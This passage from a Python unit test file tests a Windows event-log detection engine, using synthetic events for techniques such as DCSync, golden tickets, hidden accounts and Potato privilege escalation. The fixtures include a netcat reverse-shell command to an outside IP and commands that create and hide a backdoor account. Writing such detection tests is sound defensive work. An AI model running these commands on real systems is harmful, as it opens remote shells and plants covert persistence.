        alert = next((item for item in alerts if item.rule_name == "Reversible Password Encryption Enabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")

    def test_account_control_not_delegatable_detection(self):
        event = make_event(
            4738,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            target_user="hack1",
            target_domain="OFFSEC",
            event_data={
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
                "TargetUserName": "hack1",
                "TargetDomainName": "OFFSEC",
                "OldUacValue": "0x210",
                "NewUacValue": "0x4210",
                "UserAccountControl": "\n\t\t%%2094",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Sensitive and Not Delegatable Enabled"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\hack1")

    def test_user_renamed_to_admin_like_name_detection(self):
        event = make_event(
            4781,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="admmig",
            subject_domain="OFFSEC",
            event_data={
                "OldTargetUserName": "hacker42",
                "NewTargetUserName": "adminupn42",
                "TargetDomainName": "OFFSEC",
                "TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-1239",
                "SubjectUserName": "admmig",
                "SubjectDomainName": "OFFSEC",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "User Renamed to Admin-Like Name"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\adminupn42")

    def test_computer_account_renamed_without_trailing_dollar_detection(self):
        event = make_event(
            4781,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="hack1",
            subject_domain="OFFSEC",
            event_data={
                "OldTargetUserName": "compnay-88$",
                "NewTargetUserName": "rootdc1",
                "TargetDomainName": "OFFSEC",
                "TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-1296",
                "SubjectUserName": "hack1",
                "SubjectDomainName": "OFFSEC",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Computer Account Renamed Without Trailing Dollar"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"OFFSEC\rootdc1")

    def test_samaccount_spoofing_rename_with_follow_on_kerberos_detection(self):
        base = datetime(2024, 12, 6, 11, 0, tzinfo=timezone.utc)
        rename = make_event(
            4781,
            timestamp=base,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="hack1",
            subject_domain="OFFSEC",
            event_data={
                "OldTargetUserName": "dcshadow-01$",
                "NewTargetUserName": "rootdc1",
                "TargetDomainName": "OFFSEC",
                "TargetSid": "S-1-5-21-4230534742-2542757381-3142984815-1296",
                "SubjectUserName": "hack1",
                "SubjectDomainName": "OFFSEC",
            },
        )
        as_req = make_event(
            4768,
            timestamp=base + timedelta(seconds=5),
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            source_ip="10.10.10.25",
            event_data={
                "TargetUserName": "rootdc1",
                "TargetDomainName": "OFFSEC.LAN",
                "ServiceName": "krbtgt",
            },
        )
        service_ticket = make_event(
            4769,
            timestamp=base + timedelta(seconds=7),
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            source_ip="10.10.10.25",
            event_data={
                "TargetUserName": "rootdc1@OFFSEC.LAN",
                "TargetDomainName": "OFFSEC.LAN",
                "ServiceName": "ROOTDC1$",
            },
        )

        alerts = persistence.detect([rename, as_req, service_ticket])
        specific = next((item for item in alerts if item.rule_name == "Computer Account Spoofing Kerberos Abuse"), None)
        generic = next((item for item in alerts if item.rule_name == "Computer Account Renamed Without Trailing Dollar"), None)

        self.assertIsNotNone(specific)
        self.assertIsNone(generic)
        self.assertEqual(specific.source_ip, "10.10.10.25")
        self.assertEqual(specific.evidence.get("as_req_count"), 1)
        self.assertEqual(specific.evidence.get("service_ticket_count"), 1)
        self.assertIn("ROOTDC1$", specific.evidence.get("service_names", []))

    def test_sql_server_role_membership_detection_from_raw_xml(self):
        raw_xml = """<Event><EventData><Data>&lt;string&gt;
action_id:APRL
session_server_principal_name:OFFSEC\\admmig
target_server_principal_name:test-sql
server_instance_name:MSSQL01\\RADAR
database_name:master
object_name:sysadmin
statement:ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
&lt;/string&gt;</Data></EventData></Event>"""
        event = make_event(
            33205,
            computer="mssql01.offsec.lan",
            channel="Application",
            provider="MSSQL$RADAR",
            raw_xml=raw_xml,
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "SQL Server Role Membership Added"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, "test-sql")

    def test_mass_group_membership_change_detection(self):
        base = datetime(2024, 12, 5, 10, 0, tzinfo=timezone.utc)
        events = []
        for idx in range(6):
            events.append(
                make_event(
                    4728,
                    timestamp=base + timedelta(seconds=idx),
                    computer="rootdc1.offsec.lan",
                    channel="Security",
                    provider="Microsoft-Windows-Security-Auditing",
                    subject_user="lambda-user",
                    subject_domain="OFFSEC",
                    event_data={
                        "MemberName": "CN=hack-adm-hack,OU=Test-OU,DC=offsec,DC=lan",
                        "MemberSid": "S-1-5-21-4230534742-2542757381-3142984815-1150",
                        "TargetUserName": f"Group{idx:02d}",
                        "TargetDomainName": "OFFSEC",
                        "SubjectUserName": "lambda-user",
                        "SubjectDomainName": "OFFSEC",
                    },
                )
            )

        alerts = persistence.detect(events)
        alert = next((item for item in alerts if item.rule_name == "Mass Group Membership Change"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, "hack-adm-hack")
        self.assertEqual(alert.evidence.get("group_count"), 6)

    def test_self_added_to_group_detection(self):
        event = make_event(
            4728,
            computer="rootdc1.offsec.lan",
            channel="Security",
            provider="Microsoft-Windows-Security-Auditing",
            subject_user="lambda-user",
            subject_domain="OFFSEC",
            event_data={
                "MemberName": "CN=lambda-user,OU=Test-OU,DC=offsec,DC=lan",
                "MemberSid": "S-1-5-21-4230534742-2542757381-3142984815-1158",
                "TargetUserName": "Group02",
                "TargetDomainName": "OFFSEC",
                "SubjectUserName": "lambda-user",
                "SubjectDomainName": "OFFSEC",
                "SubjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1158",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Self-Added to Group"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, "lambda-user")

    def test_golden_ticket_use_pattern_detection(self):
        base = datetime(2024, 12, 4, 22, 9, 0, tzinfo=timezone.utc)
        events = [
            make_event(
                4769,
                timestamp=base + timedelta(seconds=offset),
                computer="rootdc1.offsec.lan",
                channel="Security",
                provider="Microsoft-Windows-Security-Auditing",
                target_user="gold-non-existing-user@offsec.lan",
                target_domain="OFFSEC.LAN",
                source_ip="10.23.23.9",
                event_data={
                    "TargetUserName": "gold-non-existing-user@offsec.lan",
                    "TargetDomainName": "offsec.lan",
                    "ServiceName": service,
                    "Status": "0x00000000",
                    "TicketOptions": "0x40810000",
                    "IpAddress": "10.23.23.9",
                },
            )
            for offset, service in [(0, "ROOTDC2$"), (3, "ROOTDC1$"), (6, "krbtgt"), (9, "FS02$")]
        ]

        alerts = credential_access.detect(events)
        alert = next((item for item in alerts if item.rule_name == "Golden Ticket Use Pattern"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.source_ip, "10.23.23.9")
        self.assertIn("krbtgt", alert.evidence.get("service_names", []))


class AttackCoverageUnitTests(unittest.TestCase):
    def test_dcsync_directory_replication_detection(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        events = [
            make_event(
                4662,
                timestamp=base,
                computer="DC1.insecurebank.local",
                subject_user="Administrator",
                subject_domain="insecurebank",
                event_data={
                    "SubjectUserName": "Administrator",
                    "SubjectDomainName": "insecurebank",
                    "SubjectLogonId": "0x4001",
                    "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
                    "AccessMask": "0x00000100",
                    "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
                },
            ),
            make_event(
                4662,
                timestamp=base + timedelta(seconds=2),
                computer="DC1.insecurebank.local",
                subject_user="Administrator",
                subject_domain="insecurebank",
                event_data={
                    "SubjectUserName": "Administrator",
                    "SubjectDomainName": "insecurebank",
                    "SubjectLogonId": "0x4001",
                    "Properties": "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
                    "AccessMask": "0x00000100",
                    "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
                },
            ),
        ]

        alerts = credential_access.detect(events)
        alert = next((item for item in alerts if item.rule_name == "DCSync Directory Replication"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"insecurebank\Administrator")
        self.assertIn("DS-Replication-Get-Changes", alert.evidence.get("replication_rights", []))
        self.assertIn("DS-Replication-Get-Changes-All", alert.evidence.get("replication_rights", []))

    def test_bits_client_operational_job_detection(self):
        events = [
            make_event(
                3,
                computer="IEWIN7",
                channel="Microsoft-Windows-Bits-Client/Operational",
                provider="Microsoft-Windows-Bits-Client",
                event_data={"string": "backdoor", "string2": r"IEWIN7\IEUser", "Id": "{job-1}"},
            ),
            make_event(
                59,
                computer="IEWIN7",
                channel="Microsoft-Windows-Bits-Client/Operational",
                provider="Microsoft-Windows-Bits-Client",
                event_data={
                    "transferId": "{xfer-1}",
                    "name": "backdoor",
                    "Id": "{job-1}",
                    "url": r"C:\Windows\System32\cmd.exe",
                },
            ),
        ]

        alerts = persistence.detect(events)
        alert = next((item for item in alerts if item.rule_name == "BITS Client Suspicious Job"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"IEWIN7\IEUser")
        self.assertEqual(alert.evidence.get("job_name"), "backdoor")
        self.assertEqual(alert.evidence.get("url"), r"C:\Windows\System32\cmd.exe")

    def test_bits_client_operational_job_ignores_known_benign_background_updates(self):
        events = [
            make_event(
                3,
                computer="MSEDGEWIN10",
                channel="Microsoft-Windows-Bits-Client/Operational",
                provider="Microsoft-Windows-Bits-Client",
                event_data={
                    "jobTitle": "Font Download",
                    "jobId": "{job-font}",
                    "jobOwner": r"NT AUTHORITY\LOCAL SERVICE",
                    "processPath": r"C:\Windows\System32\svchost.exe",
                },
            ),
            make_event(
                61,
                computer="MSEDGEWIN10",
                channel="Microsoft-Windows-Bits-Client/Operational",
                provider="Microsoft-Windows-Bits-Client",
                event_data={
                    "transferId": "{xfer-font}",
                    "name": "Font Download",
                    "Id": "{job-font}",
                    "url": "https://fs.microsoft.com/fs/windows/config.json",
                },
            ),
        ]

        alerts = persistence.detect(events)
        alert = next((item for item in alerts if item.rule_name == "BITS Client Suspicious Job"), None)
        self.assertIsNone(alert)

    def test_hosts_file_modified_detection(self):
        event = make_event(
            11,
            computer="fs03vuln.offsec.lan",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Program Files (x86)\Notepad++\notepad++.exe",
            event_data={
                "TargetFilename": r"C:\Windows\System32\drivers\etc\hosts",
                "Image": r"C:\Program Files (x86)\Notepad++\notepad++.exe",
            },
        )

        alerts = defense_evasion.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Hosts File Modified"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.evidence.get("target_file"), r"C:\Windows\System32\drivers\etc\hosts")

    def test_local_sam_account_registry_activity_is_collapsed(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        events = [
            make_event(
                12,
                timestamp=base,
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "CreateKey",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\support",
                },
            ),
            make_event(
                13,
                timestamp=base + timedelta(seconds=1),
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "SetValue",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\support\(Default)",
                    "Details": "Binary Data",
                },
            ),
            make_event(
                12,
                timestamp=base + timedelta(minutes=10),
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "DeleteKey",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\support",
                },
            ),
            make_event(
                12,
                timestamp=base + timedelta(minutes=30),
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "CreateKey",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\support",
                },
            ),
            make_event(
                12,
                timestamp=base + timedelta(minutes=45),
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "CreateKey",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\sqlsvc",
                },
            ),
        ]

        alerts = persistence.detect(events)
        sam_alerts = [item for item in alerts if item.rule_name == "Local SAM Account Created"]
        self.assertEqual(len(sam_alerts), 2)
        support = next(item for item in sam_alerts if item.user == "support")
        self.assertEqual(support.evidence.get("create_count"), 2)
        self.assertEqual(support.evidence.get("delete_count"), 1)
        self.assertEqual(support.evidence.get("collapsed_event_count"), 4)

    def test_local_admin_account_persistence_incident_correlation(self):
        base = datetime(2024, 11, 20, 9, 49, 11, tzinfo=timezone.utc)
        events = [
            make_event(
                12,
                timestamp=base,
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "CreateKey",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\support",
                },
            ),
            make_event(
                13,
                timestamp=base + timedelta(seconds=1),
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "SetValue",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\sqlsvc\(Default)",
                    "Details": "Binary Data",
                },
            ),
            make_event(
                13,
                timestamp=base + timedelta(hours=1),
                computer="LAPTOP-JU4M3I0E",
                channel="Microsoft-Windows-Sysmon/Operational",
                provider="Microsoft-Windows-Sysmon",
                process_name_value=r"C:\Windows\System32\lsass.exe",
                event_data={
                    "EventType": "SetValue",
                    "TargetObject": r"HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C",
                    "Details": "Binary Data",
                },
            ),
        ]

        alerts = persistence.detect(events)
        signals, findings, _ = alerts_to_signals_findings(alerts)
        incidents = build_incidents(events, signals, findings, [])

        incident = next((item for item in incidents if item.incident_type == "local_admin_account_persistence"), None)
        self.assertIsNotNone(incident)
        self.assertEqual(incident.host, "LAPTOP-JU4M3I0E")
        self.assertIn("support", incident.summary)
        self.assertIn("sqlsvc", incident.summary)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].title, "Local Administrators Group Modified")

        graph = build_entity_graph(signals, findings, incidents)
        labels = {node["data"]["label"] for node in graph["nodes"]}
        self.assertIn("support", labels)
        self.assertIn("sqlsvc", labels)
        self.assertTrue(any(node["data"]["type"] == "registry" for node in graph["nodes"]))

    def test_hidden_local_account_registry_entry_detection(self):
        event = make_event(
            13,
            computer="MSEDGEWIN10",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\lsass.exe",
            event_data={
                "EventType": "SetValue",
                "TargetObject": r"HKLM\SAM\SAM\Domains\Account\Users\Names\hideme0007$\(Default)",
                "Details": "Binary Data",
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Hidden Local Account Registry Entry"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, "hideme0007$")

    def test_process_backed_fake_computer_account_detection(self):
        event = make_event(
            1,
            computer="Server002",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\wsmprovhost.exe",
            command_line_value=r'"cmd.exe" /c net user AtomicOperator$ At0micRedTeam! /add /active:yes',
            event_data={
                "User": r"SERVER002\admin_test",
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\wsmprovhost.exe",
                "CommandLine": r'"cmd.exe" /c net user AtomicOperator$ At0micRedTeam! /add /active:yes',
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Fake Computer Account Created"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, "AtomicOperator$")
        self.assertEqual(alert.subject_user, r"SERVER002\admin_test")
        self.assertEqual(alert.evidence.get("detection_source"), "process_command")

    def test_process_backed_hidden_user_registry_detection(self):
        event = make_event(
            1,
            computer="Server002",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\wsmprovhost.exe",
            command_line_value=r'"cmd.exe" /c REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0',
            event_data={
                "User": r"SERVER002\admin_test",
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\wsmprovhost.exe",
                "CommandLine": r'"cmd.exe" /c REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0',
            },
        )

        alerts = persistence.detect([event])
        alert = next((item for item in alerts if item.rule_name == "Hidden User Registry Value"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, "AtomicOperator$")
        self.assertEqual(alert.registry_key, r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist\AtomicOperator$")
        self.assertEqual(alert.evidence.get("detection_source"), "process_command")

    def test_print_spooler_exploitation_detection(self):
        event = make_event(
            1,
            computer="FS03.offsec.lan",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\spoolsv.exe",
            command_line_value=r'"cmd.exe"',
            event_data={
                "User": r"NT AUTHORITY\SYSTEM",
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\spoolsv.exe",
                "IntegrityLevel": "System",
                "CommandLine": r'"cmd.exe"',
            },
        )

        alerts = behavioral.detect([event])
        specific = next((item for item in alerts if item.rule_name == "Print Spooler Exploitation"), None)
        generic = next((item for item in alerts if item.rule_name == "Spooler Spawned Shell"), None)
        self.assertIsNotNone(specific)
        self.assertIsNone(generic)
        self.assertEqual(specific.evidence.get("execution_user"), r"NT AUTHORITY\SYSTEM")

    def test_service_account_to_system_impersonation_detection(self):
        base = datetime(2019, 5, 26, 15, 47, 56, tzinfo=timezone.utc)
        prior = make_event(
            1,
            timestamp=base,
            computer="ws01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\notepad.exe",
            parent_process_value=r"C:\Windows\System32\inetsrv\w3wp.exe",
            command_line_value=r"C:\Windows\System32\notepad.exe",
            event_data={
                "Image": r"C:\Windows\System32\notepad.exe",
                "ParentImage": r"C:\Windows\System32\inetsrv\w3wp.exe",
                "CommandLine": r"C:\Windows\System32\notepad.exe",
                "User": r"IIS APPPOOL\DefaultAppPool",
            },
        )
        access = make_event(
            10,
            timestamp=base,
            computer="ws01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            event_data={
                "SourceImage": r"C:\Windows\System32\inetsrv\w3wp.exe",
                "TargetImage": r"C:\Windows\System32\notepad.exe",
                "GrantedAccess": "0x001fffff",
            },
        )
        inject = make_event(
            8,
            timestamp=base + timedelta(seconds=1),
            computer="ws01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            event_data={
                "SourceImage": r"C:\Windows\System32\inetsrv\w3wp.exe",
                "TargetImage": r"C:\Windows\System32\notepad.exe",
            },
        )
        follow = make_event(
            1,
            timestamp=base + timedelta(seconds=4),
            computer="ws01",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\notepad.exe",
            parent_process_value=r"C:\Windows\System32\notepad.exe",
            command_line_value=r'"C:\Windows\System32\notepad.exe"',
            event_data={
                "Image": r"C:\Windows\System32\notepad.exe",
                "ParentImage": r"C:\Windows\System32\notepad.exe",
                "CommandLine": r'"C:\Windows\System32\notepad.exe"',
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )

        alerts = defense_evasion.detect([prior, access, inject, follow])
        alert = next((item for item in alerts if item.rule_name == "Service Account to SYSTEM Impersonation"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.user, r"IIS APPPOOL\DefaultAppPool")
        self.assertEqual(alert.target_user, r"NT AUTHORITY\SYSTEM")

    def test_potato_named_pipe_impersonation_detection(self):
        base = datetime(2024, 12, 6, 11, 30, tzinfo=timezone.utc)
        launch = make_event(
            1,
            timestamp=base,
            computer="ws02",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\temp\EfsPotato.exe",
            parent_process_value=r"C:\Windows\System32\cmd.exe",
            command_line_value=r"C:\temp\EfsPotato.exe whoami",
            event_data={
                "Image": r"C:\temp\EfsPotato.exe",
                "ParentImage": r"C:\Windows\System32\cmd.exe",
                "CommandLine": r"C:\temp\EfsPotato.exe whoami",
            },
        )
        pipe_create = make_event(
            17,
            timestamp=base + timedelta(seconds=1),
            computer="ws02",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\temp\EfsPotato.exe",
            event_data={
                "Image": r"C:\temp\EfsPotato.exe",
                "PipeName": r"\11111111-2222-3333-4444-555555555555\pipe\srvsvc",
            },
        )
        system_pipe = make_event(
            18,
            timestamp=base + timedelta(seconds=2),
            computer="ws02",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value="System",
            event_data={
                "Image": "System",
                "PipeName": r"\11111111-2222-3333-4444-555555555555\pipe\srvsvc",
            },
        )
        lsass_pipe = make_event(
            18,
            timestamp=base + timedelta(seconds=2),
            computer="ws02",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value="System",
            event_data={"Image": "System", "PipeName": r"\lsass"},
        )
        loopback = make_event(
            3,
            timestamp=base + timedelta(seconds=4),
            computer="ws02",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value="System",
            source_ip="::1",
            destination_ip="::1",
            event_data={"Image": "System"},
        )
        child = make_event(
            1,
            timestamp=base + timedelta(seconds=6),
            computer="ws02",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\whoami.exe",
            parent_process_value=r"C:\temp\EfsPotato.exe",
            command_line_value="whoami",
            event_data={
                "Image": r"C:\Windows\System32\whoami.exe",
                "ParentImage": r"C:\temp\EfsPotato.exe",
                "CommandLine": "whoami",
            },
        )

        alerts = defense_evasion.detect([launch, pipe_create, system_pipe, lsass_pipe, loopback, child])
        alert = next((item for item in alerts if item.rule_name == "Potato-Style Named Pipe Impersonation"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.process, r"C:\temp\EfsPotato.exe")
        self.assertEqual(alert.evidence.get("loopback_network_count"), 1)
        self.assertIn(r"C:\Windows\System32\whoami.exe", alert.evidence.get("child_processes", []))

    def test_roguepotato_named_pipe_impersonation_detection(self):
        base = datetime(2024, 12, 6, 11, 45, tzinfo=timezone.utc)
        launch = make_event(
            1,
            timestamp=base,
            computer="ws03",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Tools\RoguePotato.exe",
            parent_process_value=r"C:\Windows\System32\cmd.exe",
            command_line_value=r'RoguePotato.exe -r 10.0.2.11 -e "nc64.exe 10.0.2.11 3001 -e cmd.exe" -l 9999',
            event_data={
                "Image": r"C:\Tools\RoguePotato.exe",
                "ParentImage": r"C:\Windows\System32\cmd.exe",
                "CommandLine": r'RoguePotato.exe -r 10.0.2.11 -e "nc64.exe 10.0.2.11 3001 -e cmd.exe" -l 9999',
                "User": r"NT AUTHORITY\LOCAL SERVICE",
            },
        )
        pipe_create = make_event(
            17,
            timestamp=base + timedelta(milliseconds=25),
            computer="ws03",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Tools\RoguePotato.exe",
            event_data={
                "Image": r"C:\Tools\RoguePotato.exe",
                "PipeName": r"\RoguePotato\pipe\epmapper",
                "RuleName": "Rogue Epmapper np detected - possible RoguePotato privesc",
            },
        )
        system_pipe = make_event(
            18,
            timestamp=base + timedelta(milliseconds=70),
            computer="ws03",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value="System",
            event_data={
                "Image": "System",
                "PipeName": r"\RoguePotato\pipe\epmapper",
                "RuleName": "Rogue Epmapper np detected - possible RoguePotato privesc",
            },
        )
        child = make_event(
            1,
            timestamp=base + timedelta(milliseconds=120),
            computer="ws03",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Tools\nc64.exe",
            parent_process_value=r"C:\Tools\RoguePotato.exe",
            command_line_value=r"nc64.exe 10.0.2.11 3001 -e cmd.exe",
            event_data={
                "Image": r"C:\Tools\nc64.exe",
                "ParentImage": r"C:\Tools\RoguePotato.exe",
                "CommandLine": r"nc64.exe 10.0.2.11 3001 -e cmd.exe",
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )
        grandchild = make_event(
            1,
            timestamp=base + timedelta(milliseconds=180),
            computer="ws03",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Tools\nc64.exe",
            command_line_value="cmd.exe",
            event_data={
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Tools\nc64.exe",
                "CommandLine": "cmd.exe",
                "User": r"NT AUTHORITY\SYSTEM",
            },
        )

        alerts = defense_evasion.detect([launch, pipe_create, system_pipe, child, grandchild])
        alert = next((item for item in alerts if item.rule_name == "Potato-Style Named Pipe Impersonation"), None)
        self.assertIsNotNone(alert)
        self.assertEqual(alert.process, r"C:\Tools\RoguePotato.exe")
        self.assertEqual(alert.evidence.get("detection_variant"), "rogue_epmapper")
        self.assertIn(r"C:\Tools\nc64.exe", alert.evidence.get("child_processes", []))
        self.assertIn(r"C:\Windows\System32\cmd.exe", alert.evidence.get("child_processes", []))

    def test_hidden_local_account_persistence_incident_from_process_backed_findings(self):
        base = datetime(2024, 10, 28, 13, 28, 46, tzinfo=timezone.utc)
        create_event = make_event(
            1,
            timestamp=base,
            computer="Server002",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\cmd.exe",
            parent_process_value=r"C:\Windows\System32\wsmprovhost.exe",
            command_line_value=r'"cmd.exe" /c NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never',
            event_data={
                "User": r"SERVER002\admin_test",
                "Image": r"C:\Windows\System32\cmd.exe",
                "ParentImage": r"C:\Windows\System32\wsmprovhost.exe",
                "CommandLine": r'"cmd.exe" /c NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never',
            },
        )
        hide_event = make_event(
            1,
            timestamp=base + timedelta(seconds=10),
            computer="Server002",
            channel="Microsoft-Windows-Sysmon/Operational",
            provider="Microsoft-Windows-Sysmon",
            process_name_value=r"C:\Windows\System32\reg.exe",
            parent_process_value=r"C:\Windows\System32\cmd.exe",
            command_line_value=r'REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0',
            event_data={
                "User": r"SERVER002\admin_test",
                "Image": r"C:\Windows\System32\reg.exe",
                "ParentImage": r"C:\Windows\System32\cmd.exe",
                "CommandLine": r'REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0',
            },
        )

